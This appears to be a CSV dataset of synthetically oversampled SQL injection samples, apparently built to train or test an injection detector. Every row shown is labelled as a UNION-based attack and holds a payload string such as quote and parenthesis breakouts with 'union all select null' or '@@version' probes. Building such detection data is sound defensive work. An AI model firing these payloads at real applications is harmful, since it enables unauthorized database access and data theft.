id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000032,attack,union,"1'   )    )    union all select null,null#",nearest_attack_euclidean,R000124,0.8495449649830998
SMOTE_000033,attack,union,"-5779  )   union all select 6089,6089--",nearest_attack_euclidean,R000234,0.05099503936498006
SMOTE_000034,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000003,1.0728066931164553
SMOTE_000035,attack,union,1' union all select null#,nearest_attack_euclidean,R000054,0.46733508406703245
SMOTE_000036,attack,union,"-8943%'  )   union all select 7710,7710#",nearest_attack_euclidean,R000078,0.14637378503372564
SMOTE_000037,attack,union,"1%""   )    )    union all select null,null#",nearest_attack_euclidean,R000088,0.6295237514435192
SMOTE_000038,attack,union,"1""  )   union all select null,null,null--",nearest_attack_euclidean,R000291,0.4731013535685899
SMOTE_000039,attack,union,"-3279"" union all select 8568,8568,8568,8568--",nearest_attack_euclidean,R000006,0.36128663933819327
SMOTE_000040,attack,union,"-1015""   )    )    union all select 6624,6624#",nearest_attack_euclidean,R000148,0.1282589464623268
SMOTE_000041,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R000213,0.590644165258897
SMOTE_000042,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000012,0.22780915846790678
SMOTE_000043,attack,union,"-3445 union all select 5505,5505,5505--",nearest_attack_euclidean,R000087,0.44894111042327417
SMOTE_000044,attack,union,-5211 union all select 1754--,nearest_attack_euclidean,R000113,0.19964138021508918
SMOTE_000045,attack,union,"-3719"" union all select 6609,6609,6609,6609#",nearest_attack_euclidean,R000106,0.6202166885574033
SMOTE_000046,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,0.08782191314304963
SMOTE_000047,attack,union,"1""   )    )     )   union all select null#",nearest_attack_euclidean,R000205,1.3434570694436712
SMOTE_000048,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,0.874128240413293
SMOTE_000049,attack,union,"1"" union all select null,null#",nearest_attack_euclidean,R000283,0.5550570004330425
SMOTE_000050,attack,union,"1%'   )    )    union all select null,null#",nearest_attack_euclidean,R000035,0.5943547000451523
SMOTE_000051,attack,union,-8513' union all select 7414--,nearest_attack_euclidean,R000022,8.429369702178807e-08
SMOTE_000052,attack,union,"1"" union all select null,null#",nearest_attack_euclidean,R000283,1.4146766059633686
SMOTE_000053,attack,union,"-7868"" union all select 1805--",nearest_attack_euclidean,R000173,0.00037013896032930685
SMOTE_000054,attack,union,"1%""   )    )     )   union all select null#",nearest_attack_euclidean,R000013,0.05277981273604184
SMOTE_000055,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000180,0.09412145279693833
SMOTE_000056,attack,union,"-3279"" union all select 8568,8568,8568,8568--",nearest_attack_euclidean,R000006,0.3596977814471618
SMOTE_000057,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000226,0.09614564283009472
SMOTE_000058,attack,union,"-9622' union all select 7208,7208,7208,7208#",nearest_attack_euclidean,R000014,0.6996693712366934
SMOTE_000059,attack,union,"-8349  )   union all select 8126,8126#",nearest_attack_euclidean,R000016,0.9389078715524287
SMOTE_000060,attack,union,-3881   )    )     )   union all select 4438--,nearest_attack_euclidean,R000068,0.5293735079439165
SMOTE_000061,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000108,0.1474428290546472
SMOTE_000062,attack,union,"1 where 1992  =  1992 union all select null,null--",nearest_attack_euclidean,R000043,0.07860396680088796
SMOTE_000063,attack,union,"-4473'  )   union all select 7656,7656#",nearest_attack_euclidean,R000270,0.000630222647411054
SMOTE_000064,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,0.03552955753343022
SMOTE_000065,attack,union,"-6118 union all select 5906,5906,5906,5906,5906#",nearest_attack_euclidean,R000196,0.043114482660303696
SMOTE_000066,attack,union,"-7868"" union all select 1805--",nearest_attack_euclidean,R000173,0.15891957069886803
SMOTE_000067,attack,union,"1""   )    )    union all select null--",nearest_attack_euclidean,R000202,0.8823394049339126
SMOTE_000068,attack,union,"1%' union all select null,null,null--",nearest_attack_euclidean,R000131,0.73637774405528
SMOTE_000069,attack,union,"1 union all select null,null,null,null,null#",nearest_attack_euclidean,R000042,0.6431259405614261
SMOTE_000070,attack,union,"-6263"" union all select 8005,8005#",nearest_attack_euclidean,R000278,1.2323312190493594
SMOTE_000071,attack,union,"1  )   union all select null,null,null,null#",nearest_attack_euclidean,R000063,0.9803133465986262
SMOTE_000072,attack,union,-1641' union all select 4835#,nearest_attack_euclidean,R000172,0.35424080595703383
SMOTE_000073,attack,union,"-4031%"" union all select 9566--",nearest_attack_euclidean,R000023,0.8681881167167224
SMOTE_000074,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000026,0.41347534950000153
SMOTE_000075,attack,union,"1  )   union all select null,null,null,null#",nearest_attack_euclidean,R000063,0.5601804180174614
SMOTE_000076,attack,union,"1 union all select null,null--",nearest_attack_euclidean,R000186,1.1960352852356764
SMOTE_000077,attack,union,"-8124  )   union all select 7251,7251,7251#",nearest_attack_euclidean,R000221,0.42157457858949354
SMOTE_000078,attack,union,"-4394'   )    )    union all select 3409,3409--",nearest_attack_euclidean,R000071,0.10221805338566729
SMOTE_000079,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000167,0.618816596192455
SMOTE_000080,attack,union,1%'   )    )     )   union all select null#,nearest_attack_euclidean,R000223,0.6967606216014183
SMOTE_000081,attack,union,"1'   )    )     )   union all select null,null--",nearest_attack_euclidean,R000231,0.31078183455747266
SMOTE_000082,attack,union,"1'  )   union all select null,null,null,null--",nearest_attack_euclidean,R000057,0.0863551194593871
SMOTE_000083,attack,union,"-6118 union all select 5906,5906,5906,5906,5906#",nearest_attack_euclidean,R000196,0.04341340704322104
SMOTE_000084,attack,union,1%' union all select null#,nearest_attack_euclidean,R000247,0.561423078176404
SMOTE_000085,attack,union,"1' union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000127,1.2039527987273135
SMOTE_000086,attack,union,"-3102  )   union all select 6707,6707,6707,6707--",nearest_attack_euclidean,R000175,0.5443928965900466
SMOTE_000087,attack,union,"1'  )   union all select null,null,null,null#",nearest_attack_euclidean,R000126,1.2314849748677643
SMOTE_000088,attack,union,"-6890""   )    )     )   union all select 1115#",nearest_attack_euclidean,R000072,0.77522088977471
SMOTE_000089,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,0.5384129524860382
SMOTE_000090,attack,union,"1"" union all select null,null,null--",nearest_attack_euclidean,R000207,0.549483820454142
SMOTE_000091,attack,union,"-4960 union all select 4031,4031#",nearest_attack_euclidean,R000053,1.2056308782627327
SMOTE_000092,attack,union,"-4826 union all select 4532,4532,4532,4532,4532--",nearest_attack_euclidean,R000198,0.28488640985608726
SMOTE_000093,attack,union,1 where 7516  =  7516 union all select null#,nearest_attack_euclidean,R000139,0.7772803792007268
SMOTE_000094,attack,union,"1"" union all select null#",nearest_attack_euclidean,R000238,0.7553545971980377
SMOTE_000095,attack,union,"-6220' union all select 1462,1462#",nearest_attack_euclidean,R000046,0.20515541451020847
SMOTE_000096,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000123,0.031137947287365797
SMOTE_000097,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000099,0.43011647682266696
SMOTE_000098,attack,union,"-3391' union all select 2024,2024--",nearest_attack_euclidean,R000005,0.1731710804389381
SMOTE_000099,attack,union,-5211 union all select 1754--,nearest_attack_euclidean,R000113,1.6321476811427802
SMOTE_000100,attack,union,-3881   )    )     )   union all select 4438--,nearest_attack_euclidean,R000068,0.882331384658212
SMOTE_000101,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R000218,0.7150034225809236
SMOTE_000102,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000168,0.11788235391396423
SMOTE_000103,attack,union,union all select @@version--,nearest_attack_euclidean,R000002,0.9217343716386288
SMOTE_000104,attack,union,"-5643'   )    )    union all select 1515,1515#",nearest_attack_euclidean,R000197,0.1578933482128781
SMOTE_000105,attack,union,"-1184""   )    )     )   union all select 1482--",nearest_attack_euclidean,R000008,0.7774406695241718
SMOTE_000106,attack,union,-3988'   )    )    union all select 1113#,nearest_attack_euclidean,R000185,0.9153175738038534
SMOTE_000107,attack,union,"-6662""   )    )    union all select 6755--",nearest_attack_euclidean,R000076,0.5547183929087803
SMOTE_000108,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000180,0.3761895235109901
SMOTE_000109,attack,union,-8513' union all select 7414--,nearest_attack_euclidean,R000022,1.4819255017855202
SMOTE_000110,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R000091,0.22504158185668585
SMOTE_000111,attack,union,"-4127%' union all select 9558,9558,9558#",nearest_attack_euclidean,R000285,0.0623446553169957
SMOTE_000112,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000123,0.5102873630795102
SMOTE_000113,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000111,1.252141896171941
SMOTE_000114,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,0.2706936985417443
SMOTE_000115,attack,union,"1'   )    )     )   union all select null,null#",nearest_attack_euclidean,R000295,0.7309184216015512
SMOTE_000116,attack,union,"-8124  )   union all select 7251,7251,7251#",nearest_attack_euclidean,R000221,1.0443013394937124
SMOTE_000117,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,0.031024353121722397
SMOTE_000118,attack,union,"-3035""  )   union all select 7912,7912,7912#",nearest_attack_euclidean,R000206,0.6103125509510573
SMOTE_000119,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R000219,0.6290556042928429
SMOTE_000120,attack,union,1'   )    )     )   union all select null--,nearest_attack_euclidean,R000161,0.2808220575109555
SMOTE_000121,attack,union,-7940'  )   union all select 6024--,nearest_attack_euclidean,R000012,0.6322964953179455
SMOTE_000122,attack,union,"1  )   union all select null,null,null--",nearest_attack_euclidean,R000141,0.01784328069919865
SMOTE_000123,attack,union,1'  )   union all select null--,nearest_attack_euclidean,R000062,1.5117751937692296
SMOTE_000124,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000111,0.6575178622788584
SMOTE_000125,attack,union,"1""   )    )    union all select null#",nearest_attack_euclidean,R000269,0.03133526825404726
SMOTE_000126,attack,union,"-4571' union all select 3227,3227,3227,3227--",nearest_attack_euclidean,R000028,0.3401200975447681
SMOTE_000127,attack,union,"1%' union all select null,null,null--",nearest_attack_euclidean,R000131,0.38400267756291917
SMOTE_000128,attack,union,"-3279"" union all select 8568,8568,8568,8568--",nearest_attack_euclidean,R000006,0.006684415148827496
SMOTE_000129,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R000304,0.5432441250251142
SMOTE_000130,attack,union,"1""   )    )     )   union all select null,null--",nearest_attack_euclidean,R000118,1.370742900612839
SMOTE_000131,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000143,0.1549370494170714
SMOTE_000132,attack,union,"-6890""   )    )     )   union all select 1115#",nearest_attack_euclidean,R000072,0.1650350606676799
SMOTE_000133,attack,union,"-9361""   )    )    union all select 3112#",nearest_attack_euclidean,R000257,0.22059212005981232
SMOTE_000134,attack,union,"-6122""  )   union all select 6578,6578--",nearest_attack_euclidean,R000070,0.7542978975475205
SMOTE_000135,attack,union,-1304'  )   union all select 7639#,nearest_attack_euclidean,R000065,0.03426391227962395
SMOTE_000136,attack,union,-8513' union all select 7414--,nearest_attack_euclidean,R000022,0.34099922752689205
SMOTE_000137,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000081,0.07538741759552478
SMOTE_000138,attack,union,"-3205""  )   union all select 5233,5233,5233,5233#",nearest_attack_euclidean,R000194,0.45982550625013036
SMOTE_000139,attack,union,"-9371'  )   union all select 5900,5900,5900#",nearest_attack_euclidean,R000273,0.08935159096038893
SMOTE_000140,attack,union,"-9856"" union all select 9753--",nearest_attack_euclidean,R000282,0.0940131600700023
SMOTE_000141,attack,union,1   )    )     )   union all select null#,nearest_attack_euclidean,R000230,0.7655742813754992
SMOTE_000142,attack,union,"1""  )   union all select null,null--",nearest_attack_euclidean,R000146,0.7416556485546081
SMOTE_000143,attack,union,"-6220' union all select 1462,1462#",nearest_attack_euclidean,R000046,0.35271718613992636
SMOTE_000144,attack,union,"1  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000067,0.0002468777617661289
SMOTE_000145,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000237,0.11907298902089121
SMOTE_000146,attack,union,"1'   )    )     )   union all select null,null#",nearest_attack_euclidean,R000295,0.1633667648090394
SMOTE_000147,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000158,0.14520448600678731
SMOTE_000148,attack,union,-4960'  )   union all select 5300--,nearest_attack_euclidean,R000037,5.960464477539063e-08
SMOTE_000149,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000102,0.799470979401612
SMOTE_000150,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000066,0.5823913508989759
SMOTE_000151,attack,union,"-3954'   )    )    union all select 2417,2417--",nearest_attack_euclidean,R000058,0.05708551576752406
SMOTE_000152,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000226,0.08102973434661792
SMOTE_000153,attack,union,-9005 union all select 4410#,nearest_attack_euclidean,R000210,0.6626605451786117
SMOTE_000154,attack,union,"-2782"" union all select 2109,2109,2109#",nearest_attack_euclidean,R000297,0.745801693070994
SMOTE_000155,attack,union,"-3672""   )    )    union all select 6093#",nearest_attack_euclidean,R000109,0.49123238005513303
SMOTE_000156,attack,union,"-5438""  )   union all select 3170,3170--",nearest_attack_euclidean,R000212,0.09616087392207845
SMOTE_000157,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000158,0.3100053827652211
SMOTE_000158,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000136,0.5647843718998691
SMOTE_000159,attack,union,"1""   )    )     )   union all select null#",nearest_attack_euclidean,R000205,0.7734812116788392
SMOTE_000160,attack,union,1' where 8159  =  8159 union all select null#,nearest_attack_euclidean,R000177,0.22762280295742188
SMOTE_000161,attack,union,1%'  )   union all select null#,nearest_attack_euclidean,R000125,0.8164548222337248
SMOTE_000162,attack,union,"-8301'  )   union all select 1806,1806--",nearest_attack_euclidean,R000265,0.2666424409717491
SMOTE_000163,attack,union,"-9856"" union all select 9753--",nearest_attack_euclidean,R000282,0.07658136551402037
SMOTE_000164,attack,union,"-1184""   )    )     )   union all select 1482--",nearest_attack_euclidean,R000008,0.47302115735793065
SMOTE_000165,attack,union,"-5438""  )   union all select 3170,3170--",nearest_attack_euclidean,R000212,0.6868137030507535
SMOTE_000166,attack,union,"-5731"" union all select 3083,3083,3083#",nearest_attack_euclidean,R000142,0.20130256467557384
SMOTE_000167,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R000103,0.507473821148233
SMOTE_000168,attack,union,"1'  )   union all select null,null,null--",nearest_attack_euclidean,R000302,0.18374971902495893
SMOTE_000169,attack,union,"-5313'  )   union all select 7187,7187,7187#",nearest_attack_euclidean,R000024,0.020937566426591152
SMOTE_000170,attack,union,"1%""  )   union all select null,null#",nearest_attack_euclidean,R000135,0.6915012896815816
SMOTE_000171,attack,union,"1%'  )   union all select null,null#",nearest_attack_euclidean,R000203,0.401394620742568
SMOTE_000172,attack,union,"-5643'   )    )    union all select 1515,1515#",nearest_attack_euclidean,R000197,0.43044061154655616
SMOTE_000173,attack,union,"-8902 union all select 4339,4339,4339#",nearest_attack_euclidean,R000020,0.18078941044928165
SMOTE_000174,attack,union,"-5731"" union all select 3083,3083,3083#",nearest_attack_euclidean,R000142,0.005175807976362894
SMOTE_000175,attack,union,"-7868"" union all select 1805--",nearest_attack_euclidean,R000173,0.2959982693265041
SMOTE_000176,attack,union,"1 union all select null,null,null,null--",nearest_attack_euclidean,R000191,1.2659056738674452
SMOTE_000177,attack,union,1'   )    )     )   union all select null--,nearest_attack_euclidean,R000161,0.17238589610677107
SMOTE_000178,attack,union,"-4413%'   )    )    union all select 1345,1345#",nearest_attack_euclidean,R000260,0.22338680809166234
SMOTE_000179,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000111,0.6087327783607861
SMOTE_000180,attack,union,"1%""   )    )    union all select null,null,null#",nearest_attack_euclidean,R000293,0.044762556405954355
SMOTE_000181,attack,union,"1'  )   union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.08896928384750835
SMOTE_000182,attack,union,"1%"" union all select null,null,null,null,null--",nearest_attack_euclidean,R000259,0.889079499638963
SMOTE_000183,attack,union,"-2667  )   union all select 5848,5848,5848,5848--",nearest_attack_euclidean,R000134,0.15433668370567463
SMOTE_000184,attack,union,"1'  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000119,0.700753175905664
SMOTE_000185,attack,union,"-9622' union all select 7208,7208,7208,7208#",nearest_attack_euclidean,R000014,1.121414475218798
SMOTE_000186,attack,union,"-1844'  )   union all select 9572,9572,9572,9572#",nearest_attack_euclidean,R000222,0.2952121322970772
SMOTE_000187,attack,union,-2050' union all select 5606#,nearest_attack_euclidean,R000045,0.43571259187600747
SMOTE_000188,attack,union,"1'  )   union all select null,null,null,null--",nearest_attack_euclidean,R000057,0.06648246729971292
SMOTE_000189,attack,union,"-8124  )   union all select 7251,7251,7251#",nearest_attack_euclidean,R000221,0.42860783351035137
SMOTE_000190,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000081,0.25514768494466117
SMOTE_000191,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000099,0.27363252382026837
SMOTE_000192,attack,union,"1%"" union all select null,null--",nearest_attack_euclidean,R000266,0.02650883986154548
SMOTE_000193,attack,union,-8378%'  )   union all select 5491#,nearest_attack_euclidean,R000279,1.2259009508787846
SMOTE_000194,attack,union,"-4571' union all select 3227,3227,3227,3227--",nearest_attack_euclidean,R000028,0.12608458028775954
SMOTE_000195,attack,union,"1'   )    )    union all select null,null#",nearest_attack_euclidean,R000124,1.074125859310232
SMOTE_000196,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000158,0.4556008702393937
SMOTE_000197,attack,union,"-7418 union all select 1340,1340,1340,1340,1340#",nearest_attack_euclidean,R000213,0.048892823068554664
SMOTE_000198,attack,union,"-4960 union all select 4031,4031#",nearest_attack_euclidean,R000053,0.3922208404646924
SMOTE_000199,attack,union,"-4692%""   )    )    union all select 1781,1781#",nearest_attack_euclidean,R000249,0.25985709352011227
SMOTE_000200,attack,union,"-6775"" union all select 7484,7484#",nearest_attack_euclidean,R000225,0.42364567517886653
